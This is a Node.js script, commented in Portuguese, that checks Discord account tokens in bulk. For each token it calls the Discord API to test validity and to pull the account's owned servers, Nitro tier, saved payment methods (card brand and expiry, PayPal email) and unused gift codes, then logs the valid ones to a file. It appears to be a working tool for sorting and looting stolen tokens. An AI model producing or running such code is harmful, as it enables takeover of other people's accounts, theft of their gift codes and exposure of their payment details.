// v2.6.1
// const fetch = require('node-fetch')
// v2.6.1

const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const fs = require('fs')
var tokens = fs.readFileSync('tokens.txt', 'utf-8').replace(/\r/g, '').split('\n')
const colors = require('colors')

fs.writeFile(`valids.txt`, '', (err, data) => { })
fs.writeFile(`invalids.txt`, '', (err, data) => { })

async function start() {
    console.clear()
    for (i = 0; i < tokens.length; i++) {
        await sleep(500)
        check(tokens[i])
    }
}

async function check(token) {
    var guilds = ""
    var nitro = `Sem nitro`
    var pagamento = ""
    var res = await fetch(`https://discord.com/api/v8/users/@me/guilds`, {
        method: "GET",
        headers: {
            "authorization": `${token}`,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)
    if (res.message === "401: Unauthorized") {
        console.log(colors.red(`[INVALID] ${token}`))
        return fs.appendFile(`invalids.txt`, `[INVALID] ${token}\n`, (err, data) => { })
    }

    if (res.message === "You need to verify your account in order to perform this action.") {
        console.log(colors.yellow(`[UNVERIFIED] ${token}`))
        return fs.appendFile(`invalids.txt`, `[UNVERIFIED] ${token}\n`, (err, data) => { })
    }

    await res.map(a => {
        if (a.owner === true) {
            guilds += `[${a.name}] `
        }
    })


    var res2 = await fetch(`https://discord.com/api/v8/users/@me`, {
        method: "GET",
        headers: {
            "authorization": `${token}`,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)

    if (res2.premium_type) {
        switch (res2.premium_type) {
            case 1:
                nitro = "Classic"
                break;
            case 2:
                nitro = "Gaming"
                break;
        }
    }

    var res3 = await fetch(`https://discord.com/api/v8/users/@me/billing/payment-sources`, {
        method: "GET",
        headers: {
            "authorization": `${token}`,
            "content-type": "application/json"
        }
    }).then(resp => resp.json())

    if (res3.length != 0) {
        await res3.map(a => {
            switch (a.type) {
                case 1:
                    pagamento += ` [CARTÃO] ${a.brand.toUpperCase()} | [VAL] ${a.expires_month}/${a.expires_year}`
                    break;
                case 2:
                    pagamento += ` [PAYPAL] ${a.email}`
                    break;
            }
        })
    } else {
        pagamento = " Sem Método de Pagamento"
    }

    var res4 = await fetch(`https://discord.com/api/v8/users/@me/entitlements/gifts`, {
        method: "GET",
        headers: {
            "authorization": `${token}`,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)

    if (res4.length === 0) {
        return darlog(`[VERIFIED] ${token} | Owner Guilds: ${guilds}| Nitro: ${nitro} | Payments:${pagamento} | Gifts: Sem Gifts`)
    }

    await res4.map(async a => {
        if (a.sku_id) {
            gift(a.sku_id, a.subscription_plan.id)
        }
    })

    async function gift(sku_id, id) {
        var gift = ``
        var res5 = await fetch(`https://discord.com/api/v8/users/@me/entitlements/gift-codes?sku_id=${sku_id}&subscription_plan_id=${id}`, {
            method: "GET",
            headers: {
                "authorization": `${token}`,
                "content-type": "application/json"
            }
        }).then(resp => resp.json()).catch(() => console.error)
        await res5.map(a => {
            if (a.uses === 0) {
                gift += `https://discord.gift/${a.code} `
            }

        })

        darlog(`[VERIFIED] ${token} | Owner Guilds: ${guilds}| Nitro: ${nitro} | Payments:${pagamento} | Gifts: ${gift}`)

    }

    async function darlog(message) {
        console.log(colors.green(message))
        return fs.appendFile(`valids.txt`, `${message}\n`, (err, data) => { })
    }




}

start()

function sleep(duration) {
    return new Promise((resolve, reject) => {
        setTimeout(() => resolve(), duration);
    });
}
